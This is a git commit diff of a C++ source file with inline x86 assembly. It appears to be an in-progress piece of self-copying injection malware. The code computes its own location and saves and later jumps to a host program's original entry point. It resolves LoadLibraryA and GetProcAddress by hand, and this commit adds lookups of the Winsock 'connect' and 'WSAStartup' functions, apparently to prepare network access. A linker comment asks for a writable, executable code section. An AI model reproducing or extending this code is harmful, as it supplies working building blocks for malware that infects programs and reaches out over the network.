d7a9dd2a6203b1c1f2df49e199e4e07ed5d95a5b
jakub <hakujemy@gmail.com>
2016-01-16 09:55:56 +0100

    +WSAStartup

--- src/source.cpp
+++ src/source.cpp
@@ -1,3 +1,10 @@
+/*
+	jakub trzebiatowski
+	vs 2012, link with: 
+	/SECTION:.text,ERWKP 
+
+*/
+
 #include <stdint.h>
 
 #define GET_PARAM_(f) PARAM_ ## f : mov eax, 1337; 
@@ -18,18 +25,21 @@ int32_t SelfCopyingFunction(uint8_t* dst,
 	uint8_t* payLoad;
 	uint32_t payLoad_length;
 
-
-#define IMPORT_DLL			"ws2_32.dll"
-#define IMPORT_DLL_LEN		16
-#define IMPORT_DLL_OFFSET	0
-
+	// filling heap with static consts
+	#define IMPORT_DLL			"ws2_32.dll"
+	#define IMPORT_DLL_LEN		16
+	#define IMPORT_DLL_OFFSET	0
 	memcpy(dst+IMPORT_DLL_OFFSET, IMPORT_DLL, IMPORT_DLL_LEN);
 
-#define IMPORT_F_1			"connect"
-#define IMPORT_F_1_LEN		16
-#define IMPORT_F_1_OFFSET	(IMPORT_DLL_OFFSET+IMPORT_DLL_LEN)
-
+	#define IMPORT_F_1			"connect"
+	#define IMPORT_F_1_LEN		16
+	#define IMPORT_F_1_OFFSET	(IMPORT_DLL_OFFSET+IMPORT_DLL_LEN)
 	memcpy(dst+IMPORT_F_1_OFFSET, IMPORT_F_1, IMPORT_F_1_LEN);
+
+	#define IMPORT_F_2			"WSAStartup"
+	#define IMPORT_F_2_LEN		16
+	#define IMPORT_F_2_OFFSET	(IMPORT_F_1_OFFSET+IMPORT_F_2_LEN)
+	memcpy(dst+IMPORT_F_2_OFFSET, IMPORT_F_2, IMPORT_F_2_LEN);
 
 	_asm
 	{
@@ -41,7 +51,7 @@ start:
 foo:
 		pop ebx				;	get adress of foo
 		mov ecx, foo		;
-		sub ecx, start		;		
+		sub ecx, start		;	calc start-foo offset	
 		sub ebx, ecx		;	calc addr of start
 		mov [ebx-8], ebx	;	 store start addr on pseudo stack
 
@@ -49,18 +59,20 @@ foo:
 		sub [ebx-12], edx	;	calc addr of original entry point store original entry point addr
 
 		;LoadLibraryA
+		#define LOADLIBRARY [ebx-16]
 		GET_PARAM_(2)		;	
 		mov edx, [ebx-8]	;
 		sub edx, eax		;
 		mov edx, [edx]		;	dereference pointer
-		mov [ebx-16], edx   ;	store addr of LoadLibraryA
+		mov LOADLIBRARY, edx   ;	store addr of LoadLibraryA
 
 		;GetProcAddress
+		#define GETPROCADDRESS [ebx-20]
 		GET_PARAM_(3)		;	
 		mov edx, [ebx-8]	;
 		sub edx, eax		;
 		mov edx, [edx]		;	dereference pointer
-		mov [ebx-20], edx   ;	store addr to pointer of GetProcAddress
+		mov GETPROCADDRESS, edx   ;	store addr to pointer of GetProcAddress
 
 		;;;;;;;;;;;;;
 		; payload
@@ -68,14 +80,33 @@ foo:
 		mov eax, ebx		;
 		sub eax, PAYLOAD_HEAP_SIZE-IMPORT_DLL_OFFSET;
 		push eax			;	push param1 of LoadLibraryAS
-		call [ebx-16]			; call LoadLibrary
+		call LOADLIBRARY			; call LoadLibrary
+		#define HMODULE [ebx-32]
+		mov HMODULE, eax			; store handle to loeaded library
+
+		; recv addr of connect
+		mov ecx, ebx			;
+		sub ecx, PAYLOAD_HEAP_SIZE-IMPORT_F_1_OFFSET;	recv ptr to param1
+		push ecx				;	push param1
+		push HMODULE			;	param 2 handler
+		call GETPROCADDRESS		; 
+
+		;store addr of connect
+		#define CONNECT [ebx-24]
+		mov CONNECT, eax
 
 
-		mov ecx, ebx		;
-		sub ecx, PAYLOAD_HEAP_SIZE-IMPORT_F_1_OFFSET;
-		push ecx			;	push param1 of LoadLibraryAS
-		push eax			; param 2 handler
-		call [ebx-20]		; call GetProcAddress
+		; recv addr of WSAStartup
+		mov ecx, ebx			;
+		sub ecx, PAYLOAD_HEAP_SIZE-IMPORT_F_2_OFFSET;	recv ptr to param1
+		push ecx				;	push param1 
+		push HMODULE				;	param 2 handler
+		call GETPROCADDRESS		; 
+
+		;store addr of WSAStartup
+		#define WSASTARTUP [ebx-28]
+		mov WSASTARTUP, eax
+
 
 		;;;;;;;;;;;;;
 		jmp [ebx-12]				
@@ -88,7 +119,7 @@ end:
 		mov eax, start;
 		mov payLoad, eax;
 
-		// PRE PROCESSOR LOOP:
+		// self modyfing, updating params
 		mov eax, param1;
 		mov PARAM_1+1, eax;
 
